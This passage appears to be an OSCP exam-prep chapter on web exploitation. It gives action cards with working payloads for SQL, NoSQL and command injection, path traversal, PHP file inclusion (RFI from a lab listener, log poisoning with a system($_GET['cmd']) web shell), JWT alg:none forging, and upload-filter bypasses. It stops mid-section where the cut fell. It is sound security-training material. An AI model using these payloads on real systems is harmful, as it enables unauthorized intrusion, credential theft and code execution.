# 02 · Web Attacks (Foothold via Web)

Start with the origins and entry points mapped in [§01.5](01-recon-and-enumeration.md#15-http--https).
This chapter is for confirming a vulnerability, proving its prerequisites, and converting the
result into access. Preserve the exact working request; method, path, body type, cookies, CSRF,
Host/SNI, and authentication state are part of the exploit.

> 🚩 **EXAM:** SQLmap and other automated exploitation tools are prohibited. Burp Community,
> manual requests, and your own notes are usable under the current guide. Re-check the
> [official rules](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
> before the exam; AI/LLMs are prohibited during both the exam and report-writing phase.

Use each technique as an action card:

```text
METHOD → ONE-LINE PRECONDITION → COPYABLE PAYLOAD → SUCCESS SIGNAL → NEXT STEP
```

Do not delete a useful payload merely because it is conditional. Keep it with the condition, or
label it `LEGACY`/`LOW-PROBABILITY` with a reason. A payload is removed only when its syntax or
claim is wrong, destructive, or no longer relevant to the confirmed stack.

**Jump:** [auth/access](#23-prioritize-web-paths) · [SQLi](#25-sql-injection) ·
[NoSQL](#26-nosql-and-orm-injection) · [command injection](#27-os-command-and-argument-injection) ·
[LFI/wrappers](#28-path-traversal-file-read-and-file-inclusion) · [upload](#29-file-upload-and-put) ·
[SSTI](#210-server-side-template-injection-ssti) · [XXE](#211-xxe) · [SSRF](#212-ssrf) ·
[deserialization](#213-insecure-deserialization) · [browser paths](#214-browser-mediated-and-secondary-paths) ·
[LDAP/XPath](#215-ldap-and-xpath-injection)

---

## 2.1 Inventory every input surface

Test each input in every relevant unauthenticated and authenticated state.

| Surface | What to record |
|---|---|
| URL | path segments, query names/values, repeated parameters, encoding |
| Forms | method, action, visible and hidden fields, CSRF, submit-button values |
| JSON | keys, nested objects, arrays, booleans, numbers, `null`, omitted fields |
| XML | element text, attributes, namespaces, SOAP action, parser errors |
| Multipart | file bytes, `filename`/`filename*`, part MIME, companion fields |
| Headers | `Host`, `User-Agent`, `Referer`, `Origin`, `X-Forwarded-*`, `X-Original-URL` |
| Client state | cookies, JWTs, serialized preferences/state, role or object IDs |
| Stored input | profile fields, filenames, messages, templates, logs, admin-visible content |

Parameter names prioritize testing but do not prove a vulnerability:

- `file`, `page`, `path`, `include`, `lang`, `download` → traversal/file inclusion;
- `url`, `callback`, `webhook`, `image`, `avatar`, `import` → SSRF/redirect;
- `cmd`, `exec`, `host`, `ip`, `ping`, `dns` → command/argument injection;
- `id`, `search`, `sort`, `filter`, `order`, `login` → SQL/NoSQL/ORM injection; when directory,
  DN, user/group, or LDAP-backed behavior is evidenced, also test LDAP filter injection;
- `template`, `message`, `subject`, `preview` → SSTI or stored/second-order use;
- XML, SOAP, SVG, office-document import → XXE/parser behavior; XML-backed login/search or XPath
  errors → XPath injection;
- `state`, `prefs`, `session`, `data` blobs → deserialization;
- `role`, `admin`, `debug`, `format` → access control, mass assignment, or misconfiguration.

## 2.2 Establish a stable differential

Do not interpret one error, delay, or `500` as confirmation.

1. Replay the valid request two or three times to measure dynamic noise.
2. Save an invalid random value as the negative control.
3. Change one variable at a time: missing, empty, same-type random, boundary, type change,
   duplicate parameter, array/object instead of scalar.
4. Send vulnerability-specific matched pairs: true/false, fast/slow, existing/missing file, or a
   unique callback token.
5. Compare status, `Location`, body marker, bytes, words/lines, errors, timing, and side effects.
6. Repeat the decisive pair. A reproducible difference is evidence; a payload list is not.

```bash
# Capture a comparable response; preserve cookies/headers/body from the real request
curl -sk -D /tmp/headers -o /tmp/body \
  -w 'code=%{http_code} bytes=%{size_download} redirect=%{redirect_url} time=%{time_total}\n' \
  <url>

wc -c -w -l /tmp/body
sha256sum /tmp/body
```

Burp Repeater is usually faster for exact request replay. Use `curl --data-urlencode` or Burp's
encoder when metacharacters would otherwise be changed by the shell or URL parser.

⛔ If there is no differential, check request fidelity before adding more payloads: exact method,
body and `Content-Type`; cookie/CSRF/auth state; Host and TLS SNI; redirect handling; soft-404 or
dynamic content; alternate method/content type; then JS/API/backups/vhosts/CMS in §01.

## 2.3 Prioritize web paths

### Tier 1 — test whenever the surface exists

- authentication/reset/registration/access-control mistakes;
- exact vulnerable product, CMS plugin/module/theme, or exposed administrative feature;
- SQL/NoSQL/ORM injection, OS command injection, traversal/file inclusion, and upload;
- exposed source/config/backups, default credentials, debug mode, and writable WebDAV.

### Tier 2 — test when the application feature suggests it

- SSRF for URL fetch/import/webhook/proxy functions;
- XXE for XML/SOAP/SVG/document parsers;
- SSTI for template/preview/render functions;
- insecure deserialization for opaque structured client state.
- LDAP filter injection only when directory-backed search/login/filter behavior is evidenced;
- XPath injection only when XML-backed login/search or XPath parser behavior is evidenced.

### Tier 3 — require an interaction or meaningful server-side sink

- XSS/CSRF/CORS when an admin bot or authenticated victim action exists;
- prototype pollution only when a server-side merge reaches an authorization or code-execution
  sink.

### Authentication and access-control quick pass

- Check vendor defaults only after identifying the product; record the source of the default.
- Compare valid/invalid usernames using status, message, response length, and timing.
- Inspect reset tokens, host-derived reset links, registration roles, hidden fields, predictable IDs,
  and direct access to authenticated paths.
- Remove or change client-supplied role/owner/debug fields in a controlled account, one at a time.
- Decode JWTs and opaque-looking state to identify algorithm, claims, type, or serialization format;
  decoding is not proof that a signature can be forged.
- Before any guessing, determine rate limit and account lockout policy. Spraying reduces per-account
  rate; it does not eliminate lockout.

#### IDOR / BOLA

**Precondition:** a request names an object and you have two controlled users or guest/auth states.

```bash
# Preserve the original request; change only the object identifier
curl -sk -b '<session-A>' <url>/api/objects/<object-A>
curl -sk -b '<session-A>' <url>/api/objects/<object-B>

# Small, bounded numeric comparison when IDs are predictable
seq 1 100 > /tmp/ids.txt
ffuf -w /tmp/ids.txt:ID -u '<url>/api/objects/ID' \
  -H 'Cookie: <session-cookie>' -ac -mc all

# GraphQL: preserve session/query/fields and swap only the object ID
curl -sk <url>/graphql -b '<session-A>' -H 'Content-Type: application/json' \
  --data '{"query":"query($id:ID!){<object>(id:$id){id}}","variables":{"id":"<object-A>"}}'
curl -sk <url>/graphql -b '<session-A>' -H 'Content-Type: application/json' \
  --data '{"query":"query($id:ID!){<object>(id:$id){id}}","variables":{"id":"<object-B>"}}'
```

**Success:** user A reads or modifies B's object, or guest reaches an authenticated object.
**Next:** test read and write authorization separately, then inspect the object for credentials,
files, reset/admin operations, or another execution-capable feature.

#### Mass assignment / trusted client fields

**Precondition:** the application accepts JSON/form objects for profile, registration, import, or
resource update.

```bash
# Replay the valid request first; add one candidate field at a time
curl -sk -X PATCH <url>/api/profile \
  -H 'Content-Type: application/json' -H 'Cookie: <session-cookie>' \
  --data '{"displayName":"probe","role":"admin"}'

curl -sk -X PATCH <url>/api/profile \
  -H 'Content-Type: application/json' -H 'Cookie: <session-cookie>' \
  --data '{"displayName":"probe","isAdmin":true}'
```

**Success:** the server persists or honors a field the original UI did not permit. **Next:** use
the least privileged new function that exposes source/config, upload, plugin, task, or command
execution; do not change unrelated users.

#### Path, method, and proxy-header authorization differences

**Precondition:** a real route returns `401/403/405`, or the stack is behind a reverse proxy.

```bash
curl -sk -i <url>/admin
curl -sk -i -X POST <url>/admin
curl -sk -i -X POST -H 'X-HTTP-Method-Override: GET' <url>/admin
curl -sk -i -H 'X-Original-URL: /admin' <url>/
curl -sk -i -H 'X-Rewrite-URL: /admin' <url>/
```

**Success:** the same resource changes from denied to allowed or exposes a different handler.
**Next:** map the newly reachable function and retest its inputs; one changed error alone is not an
authorization bypass.

#### Password-reset host handling

**Precondition:** the application generates an absolute reset link from request headers and the
test account/mailbox is controlled by you.

```bash
curl -sk -X POST <url>/forgot-password \
  -H 'Host: <controlled-host>' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'email=<controlled-account-email>'

# Keep the real URL/Host/SNI; vary one trusted proxy-host header at a time
curl -sk -X POST <url>/forgot-password \
  -H 'X-Forwarded-Host: <controlled-host>' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'email=<controlled-account-email>'

curl -sk -X POST <url>/forgot-password \
  -H 'Forwarded: host=<controlled-host>;proto=https' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'email=<controlled-account-email>'
```

**Success:** the controlled account receives a reset URL using the one supplied host/proxy header.
**Next:** prove impact only with the controlled account and keep the original working request shape.

#### JWT quick branches

**Precondition:** the application uses a JWT as an authorization decision; decode the header/claims
and establish a valid controlled-account baseline first.

```bash
# Offline HMAC-secret check only when alg is HS* and policy permits the wordlist
hashcat -m 16500 '<jwt>' /usr/share/wordlists/rockyou.txt

# alg:none candidate with a controlled claim; acceptance is library/config dependent
b64url(){ openssl base64 -A | tr '+/' '-_' | tr -d '='; }
h=$(printf '%s' '{"alg":"none","typ":"JWT"}' | b64url)
p=$(printf '%s' '{"sub":"<controlled-user>","role":"admin"}' | b64url)
printf '%s.%s.\n' "$h" "$p"
```

**Success:** the server accepts a token it should reject and honors the controlled changed claim.
**Next:** use the resulting application role and inspect admin/upload/task/plugin functions. Do not
assume decoding a JWT, changing claims, or finding a public key proves signature bypass; algorithm
confusion needs an exact vulnerable library/key-handling path.

### Known component / public PoC

Confirm exact core and plugin/module version, route, auth level, feature state, OS, architecture,
and configuration. Read the source of the exploit and replace all hard-coded target, callback,
path, and payload values. Reject denial-of-service and destructive PoCs. Record every modification.

## 2.4 Convert findings into a foothold

Follow the shortest evidence-backed capability chain:

```text
AUTHENTICATE → admin/plugin/import/task feature → controlled execution
READ         → source/config/key/hash          → credential or exact exploit
WRITE        → consumed/executable location    → controlled execution
EXECUTE      → harmless proof                  → stable shell
REACH        → internal admin/API/service       → AUTHENTICATE / READ / EXECUTE
```

For each finding, write four lines:

- **Confirm:** the matched control that proves the behavior.
- **Prerequisites:** privilege, path, parser, handler, network egress, auth, or configuration needed.
- **Fastest capability:** the least destructive useful outcome (read config before writing a shell).
- **Fallback:** what to test if the preferred conversion is unavailable.

## 2.5 SQL injection

SQLi can occur in query parameters, forms, JSON/XML values, cookies, headers, path segments, and
stored data later used by another query. It may sit in `SELECT`, `UPDATE`, `INSERT`, or `ORDER BY`
context. Preserve the original data type and query behavior while testing.

### Confirm context with matched pairs

```sql
-- Numeric-context controls
1 AND 1=1
1 AND 1=2

-- Quoted-string controls; adjust quote and comment for the DB/context
' AND '1'='1'-- -
' AND '1'='2'-- -
```

**Login-SELECT only:** after quoted context is confirmed, keep the original low-cost authentication
tests. Do not send broad `OR` conditions into an unknown `UPDATE`, `INSERT`, or `DELETE` context.

```sql
' OR '1'='1'-- -
<known-user>'-- -
```

**Success:** a repeatable authentication/result-set difference against a false control. **Next:**
prefer the authenticated application surface; otherwise fingerprint and enumerate the database.

Try a lone quote only as an error probe, then use a true/false pair. `OR 1=1` can affect every row
in an `UPDATE` or `DELETE`; avoid broad conditions until the query context is understood.

Common comments:

| DBMS | Comment form |
|---|---|
| MySQL/MariaDB | `#` or `-- ` (space required) or `/* ... */` |
| PostgreSQL | `-- ` or `/* ... */` |
| MSSQL | `-- ` or `/* ... */` |

Carry the same matched pair through every controllable location, not only the query string:

```bash
curl -skG --data-urlencode '<param>=<matched-payload>' <url>
curl -sk -H "User-Agent: ' AND '1'='1'-- -" <url>
curl -sk -H "User-Agent: ' AND '1'='2'-- -" <url>
curl -sk -H "Cookie: <name>=' AND '1'='1'-- -" <url>
```

Filter bypasses are DBMS/parser specific. Try them only after the unmodified syntax is proven:

```text
SeLeCt                         # keyword case mismatch
UN/**/ION/**/SEL/**/ECT        # inline-comment splitting where accepted
%09  %0a  %0d  /**/            # alternate encoded whitespace/comments
0x61646d696e                   # MySQL-style hex string: admin
CHAR(97,100,109,105,110)       # function and concatenation syntax varies by DBMS
```

### UNION flow

Find column count, then which column can display text. `NULL` minimizes type conflicts.

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -

-- Example only after three columns are confirmed
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,'probe',NULL-- -
```

Fingerprint and enumerate with syntax matching the confirmed DBMS:

| Goal | MySQL/MariaDB | PostgreSQL | MSSQL |
|---|---|---|---|
| Version | `@@version` | `version()` | `@@version` |
| Database | `database()` | `current_database()` | `DB_NAME()` |
| Identity | `current_user()` | `current_user` | `SYSTEM_USER` |
| Tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` |
| Columns | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` |

Other common branches:

- **SQLite:** `sqlite_version()`, table definitions in `sqlite_master`, and columns through
  `SELECT * FROM pragma_table_info('<table>')`. It has no default network database account or
  built-in OS-command feature; use exposed data/source or an application-level primitive.
- **Oracle:** version banners in `v$version`, tables in `all_tables`, and columns in
  `all_tab_columns`; literal SELECTs commonly require `FROM dual`.

Keep the verified column count in every UNION request:

```sql
' UNION SELECT NULL,@@version,NULL-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- MySQL/MariaDB compact extraction after schema/table names are confirmed
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL
  FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL
  FROM information_schema.columns WHERE table_schema=database() AND table_name='users'-- -
' UNION SELECT NULL,GROUP_CONCAT(CONCAT(username,0x3a,password)),NULL FROM users-- -

-- Chunk data when the rendered column is truncated
' UNION SELECT NULL,SUBSTRING((SELECT GROUP_CONCAT(column_name)
  FROM information_schema.columns WHERE table_name='users'),1,32),NULL-- -
```

If results are truncated, enumerate one row or substring at a time rather than assuming
`GROUP_CONCAT` exists or fits the response.

### Boolean, error, and time-based blind SQLi

Visible database errors can disclose type, query context, or selected data. After fingerprinting,
use a controlled type conversion and compare it with a valid conversion:

```sql
CAST((SELECT current_database()) AS int)    -- PostgreSQL: value may appear in the error
CONVERT(int, DB_NAME())                     -- MSSQL: value may appear in the error
```

Legacy MySQL/MariaDB targets may expose data through XML functions such as `EXTRACTVALUE`, but
these functions are version-dependent and absent from modern MySQL. Treat stack traces and
conversion errors as evidence to refine, not a reason to send destructive queries.

For boolean extraction, compare one character or length condition at a time:

```sql
' AND SUBSTRING((SELECT database()),1,1)='a'-- -                 -- MySQL
' AND SUBSTRING((SELECT current_database()),1,1)='a'-- -        -- PostgreSQL
' AND SUBSTRING(DB_NAME(),1,1)='a'-- -                           -- MSSQL
```

Time functions are DBMS- and context-specific. Use these as fragments, not universal payloads:

| DBMS | Conditional delay fragment |
|---|---|
| MySQL | `SELECT IF(<condition>,SLEEP(5),0)` |
| PostgreSQL | `SELECT CASE WHEN (<condition>) THEN pg_sleep(5) ELSE pg_sleep(0) END` |
| MSSQL | `IF (<condition>) WAITFOR DELAY '0:0:5'` |

Repeat fast/slow controls several times and account for server noise. Stacked statements depend on
the database driver; MySQL application APIs commonly disable them.

### SQLi to file or command execution — prove prerequisites first

**MySQL/MariaDB:** `LOAD_FILE()` and `SELECT ... INTO OUTFILE` require suitable database `FILE`
privilege. `secure_file_priv` may restrict the directory; the OS account needs filesystem access;
`OUTFILE` will not overwrite an existing file. Writing a server-side script also requires a known
web root and an executable handler.

```sql
SELECT @@secure_file_priv;
SELECT LOAD_FILE('/etc/hostname');
SELECT 'inert-probe' INTO OUTFILE '<known-writable-new-file>';

-- Exact bytes, no newline/field formatting; file must not already exist
SELECT 0x696e6572742d70726f6265 INTO DUMPFILE '<known-writable-new-file>';

-- Example inside a confirmed three-column UNION with a displayed middle column
' UNION SELECT NULL,LOAD_FILE('<confirmed-readable-path>'),NULL-- -
```

**MSSQL:** `xp_cmdshell` is disabled by default and normally requires high privilege to enable or
use. Check role and state before building a chain.

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell';

-- Requires a stacked/batch-capable context and permission to execute xp_cmdshell
'; EXEC master..xp_cmdshell 'whoami'-- -
```

A non-sysadmin may still execute `xp_cmdshell` only when explicit `EXECUTE` permission and a proxy
credential have been configured; do not treat `IS_SRVROLEMEMBER('sysadmin') = 0` as the only test.

**PostgreSQL:** `COPY ... PROGRAM` requires superuser-like capability such as
`pg_execute_server_program`, plus a query context that can invoke it. Large objects and filesystem
functions have separate privileges and path constraints.

```sql
-- Direct/stacked SQL only; COPY 1 with exit status 0 is the signal
COPY (SELECT '') TO PROGRAM 'id';
```

If the database cannot execute commands, prefer credentials, application secrets, password hashes,
or source/config paths that unlock another service. Use SQLmap only in non-exam labs where policy
permits it.

**Success:** a repeatable true/false/error/time difference, rendered UNION marker, extracted value,
or proven file/command capability. **Next:** take the shortest path to a credential, config/source
read, or harmless command proof; preserve the exact column count, encoding, comment, and carrier.

## 2.6 NoSQL and ORM injection

Test whether the framework changes a scalar into an operator object/array.

```text
# Form-style operator examples
username[$ne]=invalid&password[$ne]=invalid
password[$regex]=^a
username[$nin][]=admin
```

```json
{"username":{"$ne":null},"password":{"$ne":null}}
```

Copy the real endpoint, field names, CSRF, and cookies:

```bash
curl -sk -X POST <url>/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username[$ne]=invalid&password[$ne]=invalid'

curl -sk -X POST <url>/login \
  -H 'Content-Type: application/json' \
  --data '{"username":{"$ne":null},"password":{"$ne":null}}'

# Matched positive/negative controls; repeat before treating a 200 as evidence
curl -sk -X POST <url>/login -H 'Content-Type: application/json' \
  --data '{"username":{"$ne":"<unique-impossible>"},"password":{"$ne":"<unique-impossible>"}}'
curl -sk -X POST <url>/login -H 'Content-Type: application/json' \
  --data '{"username":{"$eq":"<unique-impossible>"},"password":{"$eq":"<unique-impossible>"}}'

# Prefix extraction only after regex behavior and the target identity are confirmed
curl -sk -X POST <url>/login -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":{"$regex":"^a"}}'
```

Confirmation needs matched queries that should produce opposite results, not merely one `200`.
Also try missing keys, string→number/boolean/null, nested objects, arrays, duplicate parameters, and
JSON versus form encoding. The precondition is that the parser passes attacker-controlled structure
into a database/ORM query; many frameworks normalize these values safely.

Use a confirmed bypass to reach data or an authenticated function, then look for credentials,
administrative actions, or execution features.

**Success:** opposite operators/types produce a stable authentication or result-set difference.
**Next:** authenticate or enumerate the minimum required value; then map privileged functions and
retest every API object/action under the new role.

## 2.7 OS command and argument injection

High-signal features include ping/DNS checks, image/document conversion, backup/archive, log search,
file operations, and wrappers around system utilities.

First determine whether input reaches a shell or is passed as one argument directly to a process.
Shell separators do not work when an API such as `execve(argv)` is used without a shell, but option
or argument injection may still exist.

```bash
# Unix shell probes
; id
| id
& id
&& id
|| id
$(id)
`id`

# A literal/URL-encoded newline may act as a separator
%0aid

# Windows cmd probes
& whoami
&& whoami
| whoami
|| whoami
```

Send metacharacters through the HTTP parser without letting your local shell consume them:

```bash
curl -skG --data-urlencode '<param>=probe; id' <url>
curl -skG --data-urlencode '<param>=probe|id' <url>
curl -skG --data-urlencode '<param>=probe$(id)' <url>

# If Unix-shell whitespace is filtered; shell-dependent, not an argv bypass
curl -skG --data-urlencode '<param>=cat${IFS}/etc/hostname' <url>
curl -skG --data-urlencode '<param>={cat,/etc/hostname}' <url>   # Bash brace expansion
```

For blind injection, compare repeated timing controls:

```text
# Unix
probe; sleep 0
probe; sleep 5

# Windows (ping count creates a measurable delay)
probe & ping -n 1 127.0.0.1 &
probe & ping -n 6 127.0.0.1 &
```

If separators consistently fail, test whether your value becomes one program argument:

```bash
curl -skG --data-urlencode '<param>=<expected-value>' <url>
curl -skG --data-urlencode '<param>=--help' <url>
curl -skG --data-urlencode '<param>=--version' <url>
```

A usage/version error proves attacker influence over `argv`, not shell execution. Review the
wrapped binary's documented options for a safe read/write/command primitive.

Alternatively, make a uniquely named HTTP/DNS request to a listener you control inside the
authorized lab. A callback proves server-side execution and may reveal OS/user, but egress can be
blocked. Account for quote context, URL/form encoding, whitespace filtering, and the original
command's required suffix.

Once `id`/`whoami` is reproducible, use the smallest appropriate payload from
[§03](03-shells-and-payloads.md) and record the exact encoded request.

**Success:** command output, a repeatable 5-second delta, a unique controlled callback, or a
program-option differential. **Next:** confirm OS/user with one harmless command, then select the
smallest shell payload in §03 or use the discovered argument primitive.

## 2.8 Path traversal, file read, and file inclusion

Keep the capabilities separate:

| Finding | Proven capability | Extra requirement for execution |
|---|---|---|
| Path traversal/download | Read a chosen file | Another credential/exploit/write path |
| LFI | Server includes a local file | Included content must be interpreted as code |
| RFI | Server includes a remote resource | Remote inclusion enabled and reachable |

### Traversal / arbitrary file read

**Precondition:** a parameter reaches a filesystem read/include operation. Compare a known
low-sensitivity file with a definitely missing file.

```bash
# Let curl encode a raw traversal value correctly
curl -skG --data-urlencode '<param>=../../../../etc/hostname' <url>
curl -skG --data-urlencode '<param>=/etc/hostname' <url>
curl -skG --data-urlencode '<param>=..\..\..\Windows\win.ini' <url>
curl -skG --data-urlencode '<param>=C:\Windows\win.ini' <url>

# Common normalization/filter branches; send already encoded values unchanged
curl -sk '<url>?<param>=....//....//....//etc/hostname'
curl -sk '<url>?<param>=..%2f..%2f..%2f..%2fetc%2fhostname'
curl -sk '<url>?<param>=..%252f..%252f..%252f..%252fetc%252fhostname'
curl -sk '<url>?<param>=<expected-prefix>/../../../../etc/hostname'
```

**LEGACY:** `../../../etc/passwd%00` is relevant only to old runtime/backend combinations such as
PHP before 5.3.4 when an application appends a suffix. Keep it as a version-gated last branch, not
a normal bypass.

High-value reads:

- application source and route/controller files;
- `.env`, framework/app config, database connection strings, API keys, and CMS config;
- `/proc/self/cmdline`, `/proc/self/environ`, service units, and process-specific config on Linux;
- `web.config`, `appsettings.json`, PowerShell history, unattended/deployment files on Windows;
- user SSH keys and shell history when permissions allow.

**Success:** the chosen file appears and the missing-file control differs reproducibly. **Next:**
read source/config first; distinguish a download/read primitive from an executing include sink.

### PHP source with `php://filter`

**Precondition:** the sink accepts PHP stream wrappers. `php://filter` source reading itself is not
restricted by `allow_url_fopen`.

```bash
curl -skG --data-urlencode \
  '<param>=php://filter/convert.base64-encode/resource=index.php' <url>

# Decode the returned base64 body/marker locally after isolating it
printf '%s' '<base64-output>' | base64 -d
```

**Success:** valid decoded PHP/source. **Next:** extract routes, include paths, credentials,
database settings, upload directories, and the exact vulnerable code path.

### RFI and `data://`

**Precondition:** this is a PHP *include* sink. RFI needs remote inclusion and egress; `data://`
execution needs `allow_url_fopen=On` and `allow_url_include=On`.

```bash
# RFI: serve a harmless marker from the controlled lab listener
printf '%s\n' '<?php echo "rfi-probe"; ?>' > /tmp/rfi-probe.txt
python3 -m http.server 8000 --directory /tmp
curl -skG --data-urlencode \
  '<param>=http://<lhost>:8000/rfi-probe.txt' <include-url>

# data://: base64 avoids URL-decoding damage to PHP metacharacters
marker_b64=$(printf '%s' '<?php echo "data-probe"; ?>' | base64 -w0)
curl -skG --data-urlencode \
  "<param>=data://text/plain;base64,$marker_b64" <include-url>
```

**Success:** the unique marker is rendered by the server. **Next:** replace only the harmless
marker body with the smallest command proof, then move shell delivery to §03.

### `php://input`

**Precondition:** PHP include semantics accept `php://input`, `allow_url_include=On`, and the body
is raw (not a transformed multipart body).

```bash
curl -sk '<include-url>?<param>=php://input' \
  -H 'Content-Type: text/plain' \
  --data '<?php echo "input-probe"; ?>'
```

**Success:** `input-probe` is evaluated in the response. **Next:** confirm one harmless command;
if the body is only printed/read, keep it as a read primitive rather than claiming RCE.

### Log poisoning → include

**Precondition:** control an unsanitized logged field, identify the *active* readable log path, and
confirm the sink executes included PHP. Apache/Nginx paths differ; do not assume one filename.

```bash
# 1. Write a unique PHP marker through a commonly logged header
curl -sk -A '<?php echo "log-probe"; ?>' <logged-url>/

# 2. Include each evidence-backed candidate log path
curl -skG --data-urlencode '<param>=<confirmed-log-path>' <include-url>

# 3. Only after the marker executes, replace it with a harmless command proof
curl -sk -A '<?php system($_GET["cmd"]); ?>' <logged-url>/
curl -skG --data-urlencode '<param>=<confirmed-log-path>' \
  --data-urlencode 'cmd=id' <include-url>
```

Common *leads*, not guarantees: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, and
application-specific logs disclosed by config/source. SSH/auth-log poisoning is low-probability and
environment-specific because username validation, journald, sanitization, and file permissions
often break the chain.

**Success:** the exact unique marker/command output appears only after including the poisoned log.
**Next:** record the logged field and path, then deliver the smallest stable shell through §03.

### PHP session-file inclusion

**Precondition:** the application stores file-backed PHP sessions, you control a persisted session
value, and source/config reveals a readable `session.save_path` and session ID.

```bash
# 1. Establish a session and persist a unique marker in a session-backed field
curl -sk -c /tmp/lfi-cookies.txt -b /tmp/lfi-cookies.txt \
  --data-urlencode '<session-field>=<?php echo "session-probe"; ?>' \
  <session-write-url>

# 2. Read PHPSESSID from the Netscape cookie jar
sid=$(awk '$6=="PHPSESSID"{print $7}' /tmp/lfi-cookies.txt | tail -1)

# 3. Include the proven save path; the common path below is only a candidate
curl -skG -b /tmp/lfi-cookies.txt --data-urlencode \
  "<param>=<session-save-path>/sess_$sid" <include-url>
```

Common Linux candidates include `/var/lib/php/sessions/sess_<id>`,
`/var/lib/php/session/sess_<id>`, and `/tmp/sess_<id>`; source, `phpinfo()`, or configuration must
confirm the real handler/path.

**Success:** the session marker executes from the included session file. **Next:** keep the same
session and replace only the stored marker with a harmless command proof.

### Upload/archive then include

**Precondition:** upload bytes survive, the absolute stored path is known, and the include sink
interprets the selected file/archive member.

```text
<param>=<confirmed-upload-path>/<marker-file>
<param>=zip://<absolute-upload-path>/probe.zip%23marker.php
<param>=phar://<absolute-upload-path>/probe.phar/marker.php
```

`zip://`/`phar://` require the relevant PHP extensions/archive format and a local known path.
`phar://` is not an automatic deserialization or execution primitive. `expect://id` is a
**LOW-PROBABILITY** branch because the PECL Expect extension is not enabled by default.

**Success:** the archive/file marker executes through the include request. **Next:** use §2.9 to
reproduce the upload and §03 for shell delivery.

Do not claim that an arbitrary read, EXIF value, upload, or filter chain is execution. If a chain's
prerequisites fail, use the read to recover source/config/credentials. PHP filter-chain RCE is
version/filter/context dependent and belongs in an advanced, generated-and-tested branch—not as a
universal one-liner.

## 2.9 File upload and PUT

Map the entire upload pipeline before changing extensions:

```text
ACCEPT → VALIDATE → RENAME → STORE → SERVE → PARSE/EXECUTE
```

Upload an inert uniquely named text/image marker first. Record:

```bash
printf 'upload-probe-%s\n' "$(date +%s)" > /tmp/upload-probe.txt
curl -sk <url>/upload \
  -F '<file-field>=@/tmp/upload-probe.txt;type=text/plain' \
  -F '<csrf-field>=<token>'
```

- exact multipart part name, filename, part MIME, and companion/CSRF fields;
- whether validation is client-side, server-side, or both;
- returned ID/path, generated filename, storage origin, and retrieval authorization;
- whether bytes are preserved, transformed, re-encoded, extracted, or parsed;
- response `Content-Type`, download disposition, and server-side handler behavior.

Then change one validation axis at a time:

| Axis | Controlled variations |
|---|---|
| Extension | case, alternate stack extension, double extension, trailing dot/space where relevant |
| MIME | multipart part `Content-Type`; compare with actual bytes |
| Signature | valid minimal image/document magic plus inert marker |
| Filename | length, Unicode/normalization, collision, path separator/traversal handling |
| Content | small harmless server-side marker appropriate to the confirmed stack |
| Destination | user-controlled folder/path, archive extraction, overwrite behavior |

### Build harmless execution/signature probes

**Precondition:** the server-side language/handler is identified. Prove a unique marker before any
command or shell.

```bash
# PHP execution marker
printf '%s\n' '<?php echo "upload-exec-probe"; ?>' > /tmp/upload-probe.php

# Superficial GIF signature/polyglot probe; not guaranteed to be a decodable image
printf 'GIF89a' > /tmp/upload-probe.gif
printf '%s\n' '<?php echo "upload-gif-probe"; ?>' >> /tmp/upload-probe.gif

# Valid JPEG + EXIF marker; processing/re-encoding may remove it
exiftool -Comment='<?php echo "upload-exif-probe"; ?>' \
  -o /tmp/upload-exif.jpg <valid-image.jpg>
```

### Client-side filtering

**Precondition:** JavaScript/browser validation rejects the file before the request reaches the
server.

1. Upload a permitted file through Burp Proxy.
2. Send the multipart request to Repeater.
3. Replace only the part bytes/filename/MIME being tested and resend.

**Success:** the modified request reaches server-side validation. **Next:** continue with the
server-side axes below; bypassing JavaScript is not yet an upload vulnerability.

### Extension / filename checks

**Precondition:** keep bytes, multipart MIME, auth, and companion fields constant. Send each
filename in a separate request.

```bash
curl -sk <upload-url> \
  -F '<file-field>=@/tmp/upload-probe.php;filename=probe.php;type=application/octet-stream' \
  -F '<csrf-field>=<token>'

# Repeat the same request with one filename at a time
filename=probe.pHp
filename=probe.phtml
filename=probe.php5
filename=probe.php.jpg
filename=probe.jpg.php
filename=probe.php.
filename=probe.php%20             # only if the backend decodes filename percent-encoding
```

`.phtml`/`.php5` matter only when mapped to PHP; mixed case and double extensions matter only when
validation and handler parsing disagree. `probe.php%00.jpg` is **LEGACY** and requires an old
null-byte-vulnerable backend—do not use it as a normal branch. `.phar` is not a universal PHP Web
extension and is intentionally omitted from the default list.

### Multipart MIME check

**Precondition:** use the exact same bytes and filename; change only the part `Content-Type`.

```bash
curl -sk <upload-url> \
  -F '<file-field>=@/tmp/upload-probe.php;filename=probe.php;type=image/png' \
  -F '<csrf-field>=<token>'

# Other evidence-backed comparisons
type=image/jpeg
type=image/gif
type=text/plain
type=application/octet-stream
```

**Success:** server acceptance changes only with the attacker-controlled part MIME. **Next:** find
the retrieval path and verify the response handler; accepted MIME does not imply execution.

### Magic bytes / content / EXIF

**Precondition:** extension and MIME are accepted but server content validation rejects the basic
marker.

```bash
# Use the already prepared GIF-signature probe
curl -sk <upload-url> \
  -F '<file-field>=@/tmp/upload-probe.gif;filename=probe.gif;type=image/gif' \
  -F '<csrf-field>=<token>'

# Use a real JPEG carrying an EXIF marker
curl -sk <upload-url> \
  -F '<file-field>=@/tmp/upload-exif.jpg;filename=probe.jpg;type=image/jpeg' \
  -F '<csrf-field>=<token>'
```

**Success:** bytes survive upload and can be retrieved unchanged or included separately. **Next:**
